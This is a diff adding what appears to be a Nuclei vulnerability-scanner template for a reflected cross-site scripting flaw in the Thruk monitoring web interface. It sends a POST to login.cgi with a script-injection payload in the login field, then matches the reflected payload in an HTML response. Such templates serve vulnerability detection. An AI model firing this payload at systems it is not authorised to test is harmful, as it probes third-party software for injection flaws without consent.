@@ -1,0 +1,35 @@
+id: thruk-xss
+
+info:
+  name: Thruk Monitoring Webinterface - XSS
+  author: pikpikcu
+  severity: medium
+  reference:
+    - https://www.thruk.org/download.html
+  tags: xss,thruk
+
+requests:
+  - raw:
+      - |
+        POST /thruk/cgi-bin/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{Hostname}}/thruk/cgi-bin/login.cgi?thruk
+
+        referer=%2Fthruk&login=--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=Thruk+Monitoring+Webinterface
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "</script><script>alert(document.domain)</script>"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
